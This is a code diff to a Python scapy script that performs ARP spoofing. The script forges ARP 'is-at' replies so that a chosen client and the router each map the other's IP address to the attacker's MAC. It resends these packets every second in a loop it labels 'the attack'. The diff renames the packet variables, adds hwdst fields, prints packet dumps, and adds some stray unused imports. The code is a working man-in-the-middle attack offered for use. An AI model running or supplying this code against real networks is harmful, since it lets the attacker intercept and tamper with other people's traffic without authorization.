@@ -3,6 +3,8 @@
 
 
 
+import imp
+from tabnanny import verbose
 import scapy
 import getmac
 import os
@@ -78,21 +80,23 @@ def validate():
 
 
 def createPackets():
-    global x
-    mac = getmac.get_mac_address(interface=iface)
-    x = scapy.Ether(dst=clients[int(choice)-1].cm, src=mac)/scapy.ARP(op="is-at",
-                                                          psrc=router_IP, pdst=clients[int(choice)-1].client_IP, hwsrc=mac)
-    global y
-    y = scapy.Ether(dst=router_MAC, src=mac)/scapy.ARP(op="is-at",
-                                   psrc=clients[int(choice)-1].ci, pdst=router_IP, hwsrc=mac)
+    global to_client
+    mac = getmac.get_mac_address()
+    to_client = Ether(dst=clients[int(choice)-1].client_MAC, src=mac)/ARP(op="is-at",
+                                                          psrc=router_IP, pdst=clients[int(choice)-1].client_IP, hwsrc=mac, hwdst=clients[int(choice)-1].client_MAC)
+    global to_router
+    to_router = Ether(dst=router_MAC, src=mac)/ARP(op="is-at",
+                                   psrc=clients[int(choice)-1].client_IP, pdst=router_IP, hwsrc=mac,hwdst=router_MAC)
 
 
 def launch():
     global t
     t = threading.Timer(1.0, launch)
     t.start()
-    sendp(x, verbose=0)
-    sendp(y, verbose=0)
+    sendp(to_client, verbose=0)
+    print("To client:\n"+to_client.show(dump=True))
+    sendp(to_router, verbose=0)
+    print("To router:\n"+to_router.show(dump=True))
     print("\nThe attack is running, press ENTER to stop\n")
 
 
